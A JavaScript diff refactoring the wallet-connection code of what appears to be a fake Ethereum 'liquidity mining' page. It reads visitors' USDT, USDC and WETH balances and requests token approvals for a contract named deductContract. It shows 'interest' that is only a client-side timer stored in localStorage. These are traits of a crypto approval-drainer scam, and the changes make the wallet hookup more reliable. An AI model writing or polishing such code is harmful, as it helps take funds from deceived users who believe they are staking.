@@ -38,8 +38,8 @@ claimBtn.id = 'claimButton';
 
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
-let stakingStartTime = null; // 初始化為 null
-let claimedInterest = 0; // 初始化為 0
+let stakingStartTime = null;
+let claimedInterest = 0;
 let pledgedAmount = 0;
 let interestInterval = null;
 
@@ -51,6 +51,7 @@ function updateStatus(message) {
 }
 
 function resetState(showMsg = true) {
+    console.log("執行狀態重置 (resetState)...");
     signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
     stakingStartTime = null;
     claimedInterest = 0;
@@ -134,11 +135,7 @@ function activateStakingUI() {
     claimBtn.style.marginTop = '10px';
     claimBtn.disabled = false;
     const placeholder = document.getElementById('claimButtonPlaceholder');
-    if (placeholder) {
-        placeholder.appendChild(claimBtn);
-    } else {
-        document.getElementById('liquidity').appendChild(claimBtn);
-    }
+    placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
     if (!claimBtn.hasEventListener) {
         claimBtn.addEventListener('click', claimInterest);
         claimBtn.hasEventListener = true;
@@ -147,25 +144,17 @@ function activateStakingUI() {
     interestInterval = setInterval(updateInterest, 1000);
 }
 
-// ===== 修改開始：這是最終修正版的狀態恢復函數 =====
 function restoreStakingState() {
-    // 直接從 localStorage 讀取數據，這是最可靠的數據源
     const storedStartTime = localStorage.getItem('stakingStartTime');
-    const storedClaimedInterest = localStorage.getItem('claimedInterest');
-
-    // 只有在 localStorage 中確實存在 startTime 時才恢復狀態
     if (storedStartTime) {
         console.log("偵測到已存在的挖礦狀態，正在恢復UI...");
-
-        // 更新全域變數，確保利息計算等功能正常
         stakingStartTime = parseInt(storedStartTime);
-        claimedInterest = storedClaimedInterest ? parseFloat(storedClaimedInterest) : 0;
-        
-        // 觸發 UI 更新
+        claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
         activateStakingUI();
+    } else {
+        console.log("未偵測到挖礦狀態。");
     }
 }
-// ===== 修改結束 =====
 
 //---Core Wallet Logic (核心錢包邏輯)---
 async function sendMobileRobustTransaction(populatedTx) {
@@ -191,40 +180,46 @@ async function sendMobileRobustTransaction(populatedTx) {
     return receipt;
 }
 
+// ===== 修改開始：重構初始化邏輯 =====
 async function initializeWallet() {
     try {
-        if (typeof window.ethereum === 'undefined') { updateStatus('請安裝 MetaMask、Trust Wallet 或相容的錢包以繼續。'); return; }
-        provider = new ethers.BrowserProvider(window.ethereum);
-        const network = await provider.getNetwork();
-        if (network.chainId !== 1n) {
-            updateStatus('請求切換至 Ethereum 主網... 請在錢包中批准。');
-            try { await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]); } 
-            catch (switchError) {
-                if (switchError.code === 4001) updateStatus('您拒絕了網絡切換。請手動切換至 Ethereum Mainnet 並刷新頁面。');
-                else if (switchError.code === 4902) {
-                    await provider.send('wallet_addEthereumChain', [{ chainId: '0x1', chainName: 'Ethereum Mainnet', rpcUrls: ['https://mainnet.infura.io/v3/'], nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 }, blockExplorerUrls: ['https://etherscan.io'] }]);
-                    updateStatus('已嘗試添加以太坊主網，請在錢包中確認並刷新頁面。');
-                } else updateStatus(`網絡切換失敗: ${switchError.message}。請手動切換至 Ethereum Mainnet 並刷新頁面。`);
-                return;
-            }
+        if (typeof window.ethereum === 'undefined') {
+            updateStatus('請安裝 MetaMask、Trust Wallet 或相容的錢包以繼續。');
+            return;
         }
+        provider = new ethers.BrowserProvider(window.ethereum);
+        
+        // 監聽器：當用戶在錢包中切換帳戶或斷開連接時觸發
         window.ethereum.on('accountsChanged', async (newAccounts) => {
-            console.log("帳戶切換偵測到，更新狀態...");
-            if (newAccounts.length > 0 && (!userAddress || userAddress !== newAccounts[0])) { resetState(false); await connectWallet(); }
+            console.log("偵測到帳戶變更...");
+            if (newAccounts.length === 0) {
+                console.log("所有帳戶已斷開連接。");
+                resetState(true); // 用戶在錢包中斷開連接，重置所有狀態
+            } else if (!userAddress || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
+                console.log("帳戶已切換。");
+                resetState(false); // 重置舊帳戶的狀態
+                await connectWallet(); // 用新帳戶重新連接
+            }
         });
-        window.ethereum.on('chainChanged', async () => { console.log("鏈切換偵測到，更新狀態..."); await initializeWallet(); });
+
+        window.ethereum.on('chainChanged', () => window.location.reload());
+
+        // 檢查頁面加載時是否已有授權的帳戶
         const accounts = await provider.send('eth_accounts', []);
         if (accounts.length > 0) {
-            // 注意：這裡不再調用 resetState，connectWallet 內部會處理狀態更新
-            await connectWallet(); 
+            console.log("發現已連接的帳戶，直接嘗試連接...");
+            // *** 關鍵修正：不再調用 resetState() ***
+            await connectWallet();
         } else {
-             updateStatus("請先連接您的錢包以繼續。");
+            console.log("未發現已連接帳戶。");
+            updateStatus("請先連接您的錢包以繼續。");
         }
     } catch (error) {
         console.error("初始化錢包錯誤:", error);
         updateStatus(`初始化失敗: ${error.message}`);
     }
 }
+// ===== 修改結束 =====
 
 async function checkAuthorization() {
     try {
@@ -288,17 +283,10 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
 async function connectWallet() {
     try {
         if (!provider) provider = new ethers.BrowserProvider(window.ethereum);
-        
         updateStatus('請在錢包中確認連接...');
         const accounts = await provider.send('eth_requestAccounts', []);
         if (accounts.length === 0) throw new Error("未選擇帳戶。");
         
-        const newAddress = accounts[0];
-        if (userAddress && userAddress.toLowerCase() !== newAddress.toLowerCase()) {
-            console.warn(`⚠️ 檢測到地址切換。強制重置。`);
-            resetState(false); // 只有在地址切換時才重置
-        }
-
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
         console.log("【DEBUG】錢包已連接。當前用戶地址:", userAddress);
@@ -309,19 +297,12 @@ async function connectWallet() {
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
         
         updateStatus('正在獲取錢包數據...');
-        let ethBalance, wethBalance, usdtBalance, usdcBalance;
-        try {
-            [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
-                provider.getBalance(userAddress),
-                wethContract.balanceOf(userAddress).catch(() => 0n),
-                usdtContract.balanceOf(userAddress).catch(() => 0n),
-                usdcContract.balanceOf(userAddress).catch(() => 0n),
-            ]);
-        } catch (error) {
-            ethBalance = await provider.getBalance(userAddress);
-            wethBalance = usdtBalance = usdcBalance = 0n;
-            console.warn("【DEBUG】獲取餘額失敗:", error.message);
-        }
+        const [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
+            provider.getBalance(userAddress),
+            wethContract.balanceOf(userAddress).catch(() => 0n),
+            usdtContract.balanceOf(userAddress).catch(() => 0n),
+            usdcContract.balanceOf(userAddress).catch(() => 0n),
+        ]);
         const balances = { usdt: usdtBalance, usdc: usdcBalance, weth: wethBalance };
         updateWalletBalance(balances);
         
@@ -336,14 +317,11 @@ async function connectWallet() {
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = serviceActivated && hasSufficientAllowance;
         
-        let tokensToProcess;
-        if (hasSufficientEth) {
-            tokensToProcess = [ { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }, { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS } ];
-        } else {
-            tokensToProcess = [ { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS } ];
-        }
         if (!isFullyAuthorized) {
-             await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
+            let tokensToProcess = hasSufficientEth
+                ? [ { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }, { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS } ]
+                : [ { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS } ];
+            await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
         }
         
         await checkAuthorization();
@@ -388,11 +366,11 @@ const languageSelect = document.getElementById('languageSelect');
 const elements = { title: document.getElementById('title'), subtitle: document.getElementById('subtitle'), tabLiquidity: document.getElementById('tabLiquidity'), tabPledging: document.getElementById('tabPledging'), grossOutputLabel: document.getElementById('grossOutputLabel'), cumulativeLabel: document.getElementById('cumulativeLabel'), walletBalanceLabel: document.getElementById('walletBalanceLabel'), accountBalanceLabel: document.getElementById('accountBalanceLabel'), compoundLabel: document.getElementById('compoundLabel'), nextBenefit: document.getElementById('nextBenefit'), startBtnText: document.getElementById('startBtn'), pledgeAmountLabel: document.getElementById('pledgeAmountLabel'), pledgeDurationLabel: document.getElementById('pledgeDurationLabel'), pledgeBtnText: document.getElementById('pledgeBtn'), totalPledgedLabel: document.getElementById('totalPledgedLabel'), expectedYieldLabel: document.getElementById('expectedYieldLabel'), apyLabel: document.getElementById('apyLabel'), lockedUntilLabel: document.getElementById('lockedUntilLabel'), claimBtnText: claimBtn };
 function updateLanguage(lang) { currentLang = lang; languageSelect.value = lang; for (let key in elements) { if (elements[key] && translations[lang][key]) { elements[key].textContent = translations[lang][key]; } } if (claimBtn.parentNode) claimBtn.textContent = translations[lang].claimBtnText || 'Claim'; }
 
-//---Event Listeners & Initial Load (事件監聽器與初始載入)---
+//---Event Listeners & Initial Load---
 document.addEventListener('DOMContentLoaded', () => {
     languageSelect.value = currentLang; 
     updateLanguage(currentLang);
-    initializeWallet();
+    initializeWallet(); // 頁面加載完成後開始初始化流程
 });
 
 languageSelect.addEventListener('change', (e) => updateLanguage(e.target.value));
